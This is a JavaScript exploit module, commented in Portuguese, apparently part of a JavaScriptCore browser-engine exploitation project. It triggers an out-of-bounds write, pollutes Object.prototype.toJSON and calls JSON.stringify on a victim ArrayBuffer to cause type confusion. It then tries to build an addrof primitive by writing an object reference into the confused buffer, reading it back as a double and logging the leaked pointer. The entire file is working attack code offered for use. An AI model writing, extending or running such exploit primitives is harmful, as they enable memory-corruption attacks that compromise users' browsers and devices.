// js/script3/testArrayBufferVictimCrash.mjs (Modificado para tentativa de addrof DIRETA)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// Nome do módulo atualizado para refletir a tentativa de addrof
export const FNAME_MODULE_V28 = "OriginalHeisenbug_Plus_Addrof_v1";

const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF;
const VICTIM_AB_SIZE = 64;

// Variáveis globais do script original
let toJSON_call_details_v28 = null;

// NOVA LÓGICA PARA ADDROF: Objeto cujo endereço queremos vazar.
// Será acessível dentro da sonda toJSON através de uma variável de escopo mais amplo se necessário,
// ou definido no escopo de executeArrayBufferVictimCrashTest e acessado pela sonda.
// Para simplificar, vamos definir no escopo de executeArrayBufferVictimCrashTest e criar uma
// referência global temporária para a sonda usar.
let object_to_leak_for_addrof_attempt = null;


// toJSON Ultra-Minimalista do seu script original, AGORA COM A TENTATIVA DE ESCRITA PARA ADDROF
function toJSON_V28_MinimalProbe_With_AddrofAttempt() {
    // Estrutura original para toJSON_call_details_v28
    toJSON_call_details_v28 = {
        probe_variant: "V28_Probe_With_Addrof", // Nome da sonda atualizado
        this_type_in_toJSON: "N/A_before_call",
        error_in_toJSON: null,
        probe_called: false // Importante para o log
    };

    try {
        toJSON_call_details_v28.probe_called = true;
        toJSON_call_details_v28.this_type_in_toJSON = Object.prototype.toString.call(this);
        logS3(`[toJSON_Probe_With_Addrof] 'this' é o objeto vítima. Tipo de 'this': ${toJSON_call_details_v28.this_type_in_toJSON}`, "leak");

        // MODIFICADO PARA ADDROF: Se a Heisenbug ocorrer...
        if (this === victim_ab_ref_for_original_test && toJSON_call_details_v28.this_type_in_toJSON === '[object Object]') {
            logS3(`[toJSON_Probe_With_Addrof] HEISENBUG CONFIRMADA! Tentando escrever object_to_leak_for_addrof_attempt em this[0]...`, "vuln");
            if (object_to_leak_for_addrof_attempt) {
                this[0] = object_to_leak_for_addrof_attempt; // A escrita crucial!
                logS3(`[toJSON_Probe_With_Addrof] Escrita de referência em this[0] (supostamente) realizada.`, "info");
            } else {
                logS3(`[toJSON_Probe_With_Addrof] object_to_leak_for_addrof_attempt é null. Escrita não tentada.`, "warn");
            }
        } else if (this === victim_ab_ref_for_original_test) {
            logS3(`[toJSON_Probe_With_Addrof] Heisenbug NÃO confirmada. Tipo de 'this': ${toJSON_call_details_v28.this_type_in_toJSON}`, "warn");
        }

    } catch (e) {
        toJSON_call_details_v28.error_in_toJSON = `${e.name}: ${e.message}`;
        logS3(`[toJSON_Probe_With_Addrof] ERRO na sonda: ${e.name} - ${e.message}`, "error");
    }
    // Retorno original da sua sonda
    return { minimal_probe_executed: true };
}

// Variável para manter a referência ao victim_ab para a sonda
let victim_ab_ref_for_original_test = null;

export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.triggerAndAddrof`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug Estável e Tentativa de Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;

    // Resetar detalhes da sonda
    toJSON_call_details_v28 = null;
    victim_ab_ref_for_original_test = null; // Resetar referência
    // NOVA LÓGICA PARA ADDROF: Definir o objeto alvo aqui
    object_to_leak_for_addrof_attempt = { marker: Date.now(), id: "MyTargetObject" }; // Objeto simples

    let errorCapturedMain = null;
    let stringifyOutput = null;
    // let potentiallyCrashed = true; // Não vamos mais assumir crash, focaremos no addrof
    
    // NOVA LÓGICA PARA ADDROF: Estrutura para resultado do addrof
    let addrof_result = {
        success: false,
        leaked_address_as_double: null,
        leaked_address_as_int64: null,
        message: "Addrof não tentado ou Heisenbug não ocorreu."
    };
    
    // Alvo da corrupção que funcionou no seu log original [22:49:03]
    const corruptionTargetOffsetInOOBAB = 0x7C;

    try {
        // PASSO 0: Configurar OOB (como no seu script original)
        // lastStep = "oob_setup"; // (Removido lastStep para simplificar)
        await triggerOOB_primitive({ force_reinit: true }); // Forçar re-init para consistência
        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
        logS3(`   Alvo da corrupção OOB em oob_array_buffer_real: ${toHex(corruptionTargetOffsetInOOBAB)}`, "info", FNAME_CURRENT_TEST);

        // PASSO 1: Escrita OOB CRÍTICA (como no seu script original)
        logS3(`PASSO 1: Escrevendo valor CRÍTICO ${toHex(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHex(corruptionTargetOffsetInOOBAB)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(corruptionTargetOffsetInOOBAB, CRITICAL_OOB_WRITE_VALUE, 4);
        logS3(`  Escrita OOB crítica em ${toHex(corruptionTargetOffsetInOOBAB)} realizada.`, "info", FNAME_CURRENT_TEST);
        
        await PAUSE_S3(100); 

        // PASSO 2: Criar victim_ab e Float64Array view sobre ele
        victim_ab_ref_for_original_test = new ArrayBuffer(VICTIM_AB_SIZE); // Usar a variável global para a sonda
        let float64_view_on_victim = new Float64Array(victim_ab_ref_for_original_test);
        float64_view_on_victim.fill(0.123456789101112); // Preencher com um padrão único

        logS3(`PASSO 2: victim_ab (tamanho ${VICTIM_AB_SIZE} bytes) criado. View preenchida com ${float64_view_on_victim[0]}. Tentando JSON.stringify com ${toJSON_V28_MinimalProbe_With_AddrofAttempt.name}...`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: toJSON_V28_MinimalProbe_With_AddrofAttempt, // Usar a sonda modificada
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_V28_MinimalProbe_With_AddrofAttempt.name}.`, "info", FNAME_CURRENT_TEST);

            logS3(`  Chamando JSON.stringify(victim_ab_ref_for_original_test)... (Ponto esperado da Heisenbug e escrita para addrof)`, "warn", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_ab_ref_for_original_test); 
            // potentiallyCrashed = false; // Removido
            
            logS3(`  JSON.stringify(victim_ab_ref_for_original_test) completou. Resultado (da sonda): ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            // Detalhes agora são preenchidos pela própria sonda em toJSON_call_details_v28
            logS3(`  Detalhes da sonda (toJSON_call_details_v28): ${toJSON_call_details_v28 ? JSON.stringify(toJSON_call_details_v28) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            // Verificar se a Heisenbug ocorreu (baseado no que a sonda preencheu em toJSON_call_details_v28)
            if (toJSON_call_details_v28 && toJSON_call_details_v28.probe_called && toJSON_call_details_v28.this_type_in_toJSON === "[object Object]") {
                logS3(`  HEISENBUG CONFIRMADA (fora da sonda, via toJSON_call_details_v28)! Tipo de 'this': ${toJSON_call_details_v28.this_type_in_toJSON}`, "vuln", FNAME_CURRENT_TEST);
                
                // NOVA LÓGICA PARA ADDROF: Ler do buffer após a tentativa de escrita na sonda
                logS3("PASSO 3: Verificando float64_view_on_victim[0] APÓS Heisenbug e tentativa de escrita na sonda...", "warn", FNAME_CURRENT_TEST);
                const value_read_as_double = float64_view_on_victim[0];
                addrof_result.leaked_address_as_double = value_read_as_double;
                logS3(`  Valor lido de float64_view_on_victim[0]: ${value_read_as_double}`, "leak", FNAME_CURRENT_TEST);

                const double_buffer_for_conversion = new ArrayBuffer(8);
                const double_view_for_conversion = new Float64Array(double_buffer_for_conversion);
                const int32_view_for_double_conversion = new Uint32Array(double_buffer_for_conversion);
                double_view_for_conversion[0] = value_read_as_double;
                addrof_result.leaked_address_as_int64 = new AdvancedInt64(int32_view_for_double_conversion[0], int32_view_for_double_conversion[1]);
                logS3(`  Interpretado como Int64: ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);

                if (value_read_as_double !== 0 && value_read_as_double !== 0.123456789101112 && // Não é zero nem o preenchimento
                    (addrof_result.leaked_address_as_int64.high() < 0x00020000 || (addrof_result.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                    logS3("  !!!! VALOR LIDO PARECE UM PONTEIRO POTENCIAL (addrof) !!!!", "vuln", FNAME_CURRENT_TEST);
                    addrof_result.success = true;
                    addrof_result.message = "Heisenbug confirmada E leitura de double sugere um ponteiro.";
                    document.title = `${FNAME_MODULE_V28}: Addr? ${addrof_result.leaked_address_as_int64.toString(true)}`;
                } else {
                    addrof_result.message = "Heisenbug confirmada, mas valor lido de float64_view_on_victim[0] não parece ponteiro ou buffer não foi alterado.";
                    logS3(`  INFO: ${addrof_result.message} (Valor lido: ${value_read_as_double})`, "warn", FNAME_CURRENT_TEST);
                    document.title = `${FNAME_MODULE_V28}: Heisenbug OK, Addr Falhou`;
                }
            } else {
                let msg = "Heisenbug (this como [object Object]) não foi confirmada via toJSON_call_details_v28.";
                if(toJSON_call_details_v28) msg += ` Tipo obs: ${toJSON_call_details_v28.this_type_in_toJSON}`;
                addrof_result.message = msg;
                logS3(`  ALERTA: ${addrof_result.message}`, "error", FNAME_CURRENT_TEST);
                document.title = `${FNAME_MODULE_V28}: Heisenbug Falhou`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`   ERRO CRÍTICO durante JSON.stringify ou lógica de addrof: ${e_str.name} - ${e_str.message}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_V28}: Stringify/Addrof ERR`;
            addrof_result.message = `Erro na execução principal: ${e_str.name} - ${e_str.message}`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
            }
        }

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL no teste: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_V28} FALHOU CRITICAMENTE`;
        addrof_result.message = `Erro geral no teste: ${e_outer_main.name}`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Addrof: Success=${addrof_result.success}, Msg='${addrof_result.message}'`, addrof_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        if(addrof_result.leaked_address_as_int64){
            logS3(`  Addrof (Int64): ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
         // Limpar referências globais
        object_to_leak_for_addrof_attempt = null;
        victim_ab_ref_for_original_test = null;
    }
    // Manter a estrutura de retorno compatível com o que runHeisenbugReproStrategy_ABVictim espera,
    // mas adicionando os detalhes do addrof.
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: false, // Se chegamos aqui, não crashou silenciosamente.
        stringifyResult: stringifyOutput, 
        toJSON_details: toJSON_call_details_v28, // Usar a variável global que a sonda preenche
        addrof_attempt_result: addrof_result
    };
}
